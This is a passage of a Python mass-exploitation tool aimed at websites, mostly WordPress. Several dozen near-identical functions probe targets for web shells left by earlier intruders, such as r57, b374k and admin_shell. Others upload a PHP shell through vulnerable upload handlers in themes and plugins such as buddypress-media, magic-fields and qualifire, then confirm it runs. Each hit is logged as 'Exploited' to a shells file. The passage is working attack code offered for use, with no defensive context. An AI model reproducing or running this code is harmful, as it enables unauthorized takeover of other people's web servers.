    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X122(url):
    try:
        upload_dir = url +"/r57.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X123(url):
    try:
        upload_dir = url +"/123x.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X124(url):
    try:
        upload_dir = url +"/emergency.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Up' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X125(url):
    try:
        upload_dir = url +"/wp-content/plugins/owfsmac/mar.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X126(url):
    try:
        upload_dir = url +"/b374k.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X127(url):
    try:
        upload_dir = url +"/wp-content/king.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X128(url):
    try:
        upload_dir = url +"/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X129(url):
    try:
        upload_dir = url +"/wp-content/plugins/ioptimizations/IOptimizes.php?f=f"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'aDriv' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X130(url):
    try:
        upload_dir = url +"/DKIZ.php?DKIZ"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X131(url):
    try:
        upload_dir = url +"/wp-includes/ID3/getid.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X132(url):
    try:
        upload_dir = url +"/wp-content/plugins/disqus-comment-system/disqus.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X133(url):
    try:
        upload_dir = url +"/wp-content/verified.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X134(url):
    try:
        upload_dir = url +"/wp-content/uploadxx/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X135(url):
    try:
        upload_dir = url +"/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X136(url):
    try:
        upload_dir = url +"/wp-content/verify.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X137(url):
    try:
        upload_dir = url +"/wp-content/admin_shell.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X138(url):
    try:
        phpx = "Files/TitaniumEx.php"
        data1 = {'formData': (phpx, shell, 'text/html')}
        upload_dir = url +"/wp-content/uploads/rtMedia/tmp/TitaniumEx.php?Titanium=Ex"
        postdir = url +"/wp-content/plugins/buddypress-media/app/helper/rtUploadAttachment.php"
        xex = requests.post(postdir,files=data1,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X139(url):
    try:
        phpx = "files/TitaniumEx.php"
        file = {'qqfile':open(phpx, 'rb')}
        postdir = url +"/wp-content/themes/cameleon/includes/fileuploader/upload_handler.php"
        upload_dir = url +'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=file,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X140(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +"/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php"
        upload_dir = url +'/wp-content/themes/qualifire/scripts/admin/uploadify/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X141(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +"/wp-content/themes/Ghost/includes/uploadify/upload_Settings2_image.php"
        upload_dir = url +'/wp-content/uploads/settingsimages/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X142(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +"/wp-content/themes/kiddo/app/assets/js/uploadify/uploadify.php"
        upload_dir = url +'/wp-content/themes/elemin/uploads/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X143(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +"/wp-content/themes/elemin/themify/themify-ajax.php?upload=1"
        upload_dir = url +'/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X144(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +"/wp-content/themes/RightNow/includes/uploadify/upload_background_image.php"
        upload_dir = url +'/wp-content/uploads/galleryimages/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X145(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'qqfile':open (php, 'rb')}
        postdir = url +"/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php"
        upload_dir = url +'/wp-content/files_mf/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X146(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        postdir = url +"/wp-content/themes/dance-studio/core/libs/imperavi/tests/file_upload.php"
        upload_dir = url +'/wp-content/uploads/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
